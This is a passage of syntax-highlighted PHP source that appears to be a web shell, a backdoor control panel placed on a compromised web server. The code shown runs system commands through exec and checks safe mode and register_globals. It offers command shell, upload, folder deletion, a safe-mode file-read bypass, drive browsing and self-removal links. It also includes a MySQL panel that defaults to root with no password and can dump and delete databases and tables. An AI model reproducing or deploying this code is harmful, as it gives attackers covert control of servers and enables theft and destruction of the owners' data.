<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;register_globals&quot;</span><span class="p">)){</span><span class="nv">$reg_g</span><span class="o">=</span><span class="s2">&quot;ON&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$reg_g</span><span class="o">=</span><span class="s2">&quot;OFF&quot;</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">)){</span><span class="nv">$safe_m</span><span class="o">=</span><span class="s2">&quot;ON&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$safe_m</span><span class="o">=</span><span class="s2">&quot;OFF&quot;</span><span class="p">;}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;id:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;uname -a:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;uname -a&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span> <span class="k">echo</span><span class="s2">&quot;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Your IP: [&amp;lt;font color=#5F3CC1&amp;gt;</span><span class="si">$ip</span><span class="s2">&amp;lt;/font&amp;gt;] Server IP: [&amp;lt;font color=#5F3CC1&amp;gt;&quot;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;] Server &amp;lt;a href=# title=&#39;Host.Domain&#39;&amp;gt;H.D.&amp;lt;/a&amp;gt;: [&amp;lt;font color=#5F3CC1&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;]&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">[&amp;lt;b&amp;gt;Safe mode:&amp;lt;/b&amp;gt; </span><span class="si">$safe_m</span><span class="s2">] [&amp;lt;b&amp;gt;Register globals:&amp;lt;/b&amp;gt; </span><span class="si">$reg_g</span><span class="s2">]&amp;lt;br&amp;gt;</span>
<span class="s2">[&amp;lt;a href=# onClick=location.href=</span><span class="se">\&quot;</span><span class="s2">javascript:history.back(-1)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Back&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">&#39;&amp;gt;Home&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;sh311=1&#39;&amp;gt;Shell (1)&amp;lt;/a&amp;gt; &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;sh311=2&#39;&amp;gt;(2)&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;t=upload&#39;&amp;gt;Upload&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?t=tools&#39;&amp;gt;Tools&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=info&#39;&amp;gt;PHPinfo&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?delfolder=</span><span class="si">$d</span><span class="s2">&amp;d=</span><span class="si">$d</span><span class="s2">&amp;delfl=1&amp;rback=</span><span class="si">$d</span><span class="s2">&#39; title=&#39;</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;DEL Folder&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&#39;&amp;gt;SQL&amp;lt;/a&amp;gt;]</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=selfremover&#39;&amp;gt;Self Remover&amp;lt;/a&amp;gt;]</span>
<span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=white&amp;gt;</span>
<span class="s2">&amp;lt;center&amp;gt;&amp;lt;font face=wingdings size=2&amp;gt;&amp;lt;&amp;lt;/font&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=a:/&#39;&amp;gt;A&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=b:/&#39;&amp;gt;B&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=c:/&#39;&amp;gt;C&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=d:/&#39;&amp;gt;D&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=e:/&#39;&amp;gt;E&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=f:/&#39;&amp;gt;F&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=g:/&#39;&amp;gt;G&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=h:/&#39;&amp;gt;H&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=i:/&#39;&amp;gt;I&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=j:/&#39;&amp;gt;J&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=k:/&#39;&amp;gt;K&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=l:/&#39;&amp;gt;L&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=m:/&#39;&amp;gt;M&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=n:/&#39;&amp;gt;N&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=o:/&#39;&amp;gt;O&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=p:/&#39;&amp;gt;P&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=q:/&#39;&amp;gt;Q&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=r:/&#39;&amp;gt;R&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=s:/&#39;&amp;gt;S&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=t:/&#39;&amp;gt;T&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=u:/&#39;&amp;gt;U&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=v:/&#39;&amp;gt;V&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=w:/&#39;&amp;gt;W&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=x:/&#39;&amp;gt;X&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=y:/&#39;&amp;gt;Y&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=z:/&#39;&amp;gt;Z&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="s2">:: &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;mkdir=1&#39;&amp;gt;Create folder&amp;lt;/a&amp;gt; ::</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;mkfile=1&#39;&amp;gt;Create file&amp;lt;/a&amp;gt; ::</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;read_file_safe_mode=1&#39;&amp;gt;Read file if safe mode is On&amp;lt;/a&amp;gt; ::&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ps_table=1&#39;&amp;gt;PS table&amp;lt;/a&amp;gt; ::&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>





<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;ftp&quot;</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>



<span class="k">print</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>










<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;sql&quot;</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>

<span class="c1">####</span>

<span class="nv">$f_d</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f_d&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$f_d</span><span class="p">)){</span><span class="nv">$f_d</span><span class="o">=</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$f_d</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$f_d</span><span class="o">=</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>

<span class="nv">$php_self</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span>
<span class="nv">$delete_table</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_table&#39;</span><span class="p">];</span>
<span class="nv">$tbl</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">];</span>
<span class="nv">$from</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
<span class="nv">$to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
<span class="nv">$adress</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;adress&#39;</span><span class="p">];</span>
<span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="nv">$login</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">];</span>
<span class="nv">$pass</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="nv">$adress</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;adress&#39;</span><span class="p">];</span>
<span class="nv">$port</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="nv">$login</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">];</span>
<span class="nv">$pass</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="nv">$conn</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;conn&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$adress</span><span class="p">)){</span><span class="nv">$adress</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$login</span><span class="p">)){</span><span class="nv">$login</span><span class="o">=</span><span class="s2">&quot;root&quot;</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)){</span><span class="nv">$pass</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$port</span><span class="p">)){</span><span class="nv">$port</span><span class="o">=</span><span class="s2">&quot;3306&quot;</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$from</span><span class="p">)){</span><span class="nv">$from</span><span class="o">=</span><span class="mi">0</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$to</span><span class="p">)){</span><span class="nv">$to</span><span class="o">=</span><span class="mi">50</span><span class="p">;}</span>


<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;style&amp;gt;</span>
<span class="x">table,td{</span>
<span class="x">color: black;</span>
<span class="x">font-face: verdana;</span>
<span class="x">font-size: 11px;</span>

<span class="x">}</span>
<span class="x">&amp;lt;/style&amp;gt;</span>
<span class="x">&amp;lt;font color=black face=verdana size=1&amp;gt;</span>
<span class="cp">&lt;?</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$conn</span><span class="p">){</span> <span class="cp">?&gt;</span><span class="x"></span>

<span class="x">&amp;lt;!-- table 1 --&amp;gt;</span>
<span class="x">&amp;lt;table bgcolor=#D7FFA8&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;&amp;lt;td valign=top&amp;gt;Address:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form&amp;gt;&amp;lt;input name=adress value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$adress</span><span class="cp">?&gt;</span><span class="x">&#39; size=20&amp;gt;&amp;lt;input name=port value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$port</span><span class="cp">?&gt;</span><span class="x">&#39; size=6&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;&amp;lt;Td valign=top&amp;gt;Login: &amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=login value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$login</span><span class="cp">?&gt;</span><span class="x">&#39; size=10&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;&amp;lt;Td valign=top&amp;gt;Pass:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &amp;lt;input name=pass value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$pass</span><span class="cp">?&gt;</span><span class="x">&#39; size=10&amp;gt;&amp;lt;input type=hidden name=p value=sql&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=conn value=Connect&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="cp">&lt;?</span><span class="p">}</span><span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;tr&amp;gt;&amp;lt;td valign=top&amp;gt;</span><span class="cp">&lt;?</span> <span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">){</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;PHP v&quot;</span><span class="o">.@</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;mySQL v&quot;</span><span class="o">.@</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span><span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;!-- end of table 1 --&amp;gt;</span>


<span class="cp">&lt;?</span>
<span class="nv">$conn</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;conn&#39;</span><span class="p">];</span>
<span class="nv">$adress</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;adress&#39;</span><span class="p">];</span>
<span class="nv">$port</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="nv">$login</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">];</span>
<span class="nv">$pass</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">){</span>

<span class="nv">$serv</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$adress</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$port</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;Error: &quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$serv</span><span class="p">){</span><span class="nv">$status</span><span class="o">=</span><span class="s2">&quot;Connected. :: &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&#39;&amp;gt;Log out&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$status</span><span class="o">=</span><span class="s2">&quot;Disconnected.&quot;</span><span class="p">;}</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;Status: </span><span class="si">$status</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> <span class="c1"># #D7FFA8</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;table cellpadding=0 cellspacing=0 bgcolor=#D7FFA8&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td valign=top&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;font color=red&amp;gt;[db]&amp;lt;/font&amp;gt;&amp;lt;Br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;font color=white&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$serv</span><span class="p">);</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$str</span><span class="o">=</span><span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;delete_db=</span><span class="si">$str[0]</span><span class="s2">&#39; onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE </span><span class="si">$str[0]</span><span class="s2"> ?</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;[DEL]&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$str[0]</span><span class="s2">&amp;dump_db=</span><span class="si">$str[0]</span><span class="s2">&amp;f_d=</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;[DUMP]&amp;lt;/a&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;b&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?baza=1&amp;db=</span><span class="si">$str[0]</span><span class="s2">&amp;p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$str[0]</span><span class="s2">&#39;&amp;gt;</span><span class="si">$str[0]</span><span class="s2">&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$tc</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$baza</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;baza&#39;</span><span class="p">];</span>
<span class="nv">$db</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">];</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;font color=red&amp;gt;[Total db: </span><span class="si">$tc</span><span class="s2">]&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$baza</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;div align=left&amp;gt;&amp;lt;font color=green&amp;gt;db: [</span><span class="si">$db</span><span class="s2">]&amp;lt;/div&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$result</span><span class="o">=@</span><span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$db</span><span class="p">);</span>
<span class="k">while</span><span class="p">(</span><span class="nv">$str</span><span class="o">=@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
<span class="nv">$c</span><span class="o">=</span><span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM </span><span class="si">$str[0]</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nv">$records</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$s4ot</span><span class="p">){</span><span class="nv">$s4ot</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]);}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$records</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;0&quot;</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;delete_table=</span><span class="si">$str[0]</span><span class="s2">&#39; onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE </span><span class="si">$str[0]</span><span class="s2"> ?</span><span class="se">\&quot;</span><span class="s2">)&#39; title=&#39;Delete </span><span class="si">$str[0]</span><span class="s2">?&#39;&amp;gt;[D]&amp;lt;/a&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;baza=1&amp;rename_table=</span><span class="si">$str[0]</span><span class="s2">&#39; title=&#39;Rename </span><span class="si">$str[0]</span><span class="s2">&#39;&amp;gt;[R]&amp;lt;/a&amp;gt;&amp;lt;font color=red&amp;gt;[</span><span class="si">$records[0]</span><span class="s2">]&amp;lt;/font&amp;gt; &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?vnutr=1&amp;p=sql&amp;vn=</span><span class="si">$str[0]</span><span class="s2">&amp;baza=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$str[0]</span><span class="s2">&amp;ins_new_line=1&#39;&amp;gt;</span><span class="si">$str[0]</span><span class="s2">&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
